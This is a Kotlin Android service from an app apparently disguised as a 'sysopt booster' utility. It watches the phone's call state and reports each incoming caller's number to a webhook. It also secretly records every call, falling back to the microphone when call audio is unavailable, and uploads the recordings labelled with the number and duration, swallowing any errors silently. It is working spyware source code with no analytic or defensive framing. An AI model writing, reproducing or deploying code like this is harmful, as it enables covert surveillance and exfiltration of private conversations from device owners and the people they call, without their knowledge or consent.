package com.sysopt.booster

import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.MediaRecorder
import android.os.Build
import android.os.Environment
import android.os.IBinder
import android.telephony.PhoneStateListener
import android.telephony.TelephonyManager
import android.util.Log
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class CallMonitorService : Service() {
    private lateinit var telephonyManager: TelephonyManager
    private var mediaRecorder: MediaRecorder? = null
    private var isRecording = false
    private var currentNumber = ""
    private var callStartTime = 0L

    private val phoneStateListener = object : PhoneStateListener() {
        override fun onCallStateChanged(state: Int, phoneNumber: String?) {
            when (state) {
                TelephonyManager.CALL_STATE_IDLE -> {
                    // Call ended
                    if (isRecording) {
                        val duration = System.currentTimeMillis() - callStartTime
                        stopCallRecording(duration)
                    }
                }

                TelephonyManager.CALL_STATE_OFFHOOK -> {
                    // Call active
                    currentNumber = phoneNumber ?: "unknown"
                    callStartTime = System.currentTimeMillis()
                    startCallRecording()
                }

                TelephonyManager.CALL_STATE_RINGING -> {
                    // Incoming call
                    WebhookClient.sendCallAlert("incoming", phoneNumber ?: "unknown")
                }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            // Android 12+ handles permissions differently
        }

        telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
        startForeground(2005, NotificationHelper.createNotification(this, "Call Monitor Active"))
    }

    private fun startCallRecording() {
        if (isRecording) return

        try {
            mediaRecorder = MediaRecorder().apply {
                // Try VOICE_CALL first
                setAudioSource(MediaRecorder.AudioSource.VOICE_CALL)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(128000)
                setOutputFile(getCallRecordingFile())
                prepare()
                start()
            }
            isRecording = true
        } catch (e: Exception) {
            // Fallback to MIC
            try {
                mediaRecorder = MediaRecorder().apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setAudioSamplingRate(44100)
                    setAudioEncodingBitRate(128000)
                    setOutputFile(getCallRecordingFile())
                    prepare()
                    start()
                }
                isRecording = true
            } catch (e2: Exception) {
                // Silent fail
            }
        }
    }

    private fun stopCallRecording(duration: Long) {
        if (!isRecording) return

        try {
            mediaRecorder?.apply {
                stop()
                release()
            }
            isRecording = false
            mediaRecorder = null

            val file = getCallRecordingFile()
            if (file.exists() && file.length() > 0) {
                WebhookClient.sendFile(file.absolutePath, "call_recording_${currentNumber}_${duration}ms")
            }
        } catch (e: Exception) {
            // Silent
        }
    }

    private fun getCallRecordingFile(): File {
        val dir = getExternalFilesDir(Environment.DIRECTORY_MUSIC)
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val safeNumber = currentNumber.replace(Regex("[^0-9]"), "")
        return File(dir, "call_${safeNumber}_$timestamp.mp4")
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE)
        if (isRecording) {
            stopCallRecording(0)
        }
    }
}